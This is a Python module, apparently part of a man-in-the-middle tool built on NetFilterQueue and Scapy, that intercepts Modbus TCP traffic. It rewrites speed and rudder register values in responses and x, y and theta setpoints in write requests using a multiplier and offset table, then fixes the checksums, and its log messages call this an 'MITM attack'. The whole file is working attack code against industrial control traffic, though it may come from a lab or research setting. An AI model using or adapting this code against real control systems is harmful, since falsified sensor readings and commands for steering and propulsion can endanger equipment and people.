'''
NFQ module. Callbacks and persistent object
'''

from scapy.all import IP, TCP, Packet, Ether, IPv6
from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse
from ..mod_table import ModTable
from ..buffer import Buffer

class NetFilterQueueBaseClass:

    def __init__(self, buffer: Buffer, mod_table: ModTable):
        self.buffer = buffer
        self.table = mod_table

        self.running = False
        self.stop_event = None
        self.thread = None

    def is_running(self):
        return self.running

    def stop(self):
        if not self.is_running():
            self.buffer.put("nfq", "MITM attack is not running")
            return
        else:
            self.stop_event.set()
            self.thread.join(timeout=2)
            self.stop_event = None
            self.thread = None
            self.buffer.put("nfq", "Stopped MITM attack")
            self.running = False

    def modify_spkt(self, spkt: Packet) -> tuple[Packet, bool]:
        '''
        Returns a packet, modified according to the mod table
        '''
        modified_flag = False
        if spkt.haslayer("Read Holding Registers Response"):
            mult = self.table.get_raw("speed", "mult")
            offset = self.table.get_raw("speed", "offset")

            mbl = spkt.getlayer(ModbusADUResponse)

            speed = mbl.payload.registerVal[0]
            val = int(speed * mult + offset)
            val = max(0, min(65535, val))
            mbl.payload.registerVal[0] = val

            if len(mbl.payload.registerVal) > 1:
                mult = self.table.get_raw("rudder", "mult")
                offset = self.table.get_raw("rudder", "offset")
                rudder = mbl.payload.registerVal[1]
                val = int(rudder * mult + offset)
                val = max(0, min(65535, val))
                mbl.payload.registerVal[1] = val

            modified_flag = True

        elif spkt.haslayer("Write Single Register"):

            mbl = spkt.getlayer(ModbusADURequest)

            if mbl.payload.registerAddr == 10: # X address
                var = "x"
            elif mbl.payload.registerAddr == 11: # Y address
                var = "y"
            else: # Theta address
                var = "theta"

            z = mbl.payload.registerValue
            mult = self.table.get_raw(var, "mult")
            offset = self.table.get_raw(var, "offset")
            val = int(z * mult + offset)
            val = max(0, min(65535, val))
            mbl.payload.registerValue = val

            modified_flag = True

        # Recalculate checksums if modified
        if modified_flag:
            # del mbl.len
            del spkt[IP].len
            del spkt[TCP].chksum
            del spkt[IP].chksum

            spkt = IP(bytes(spkt))
        return spkt, modified_flag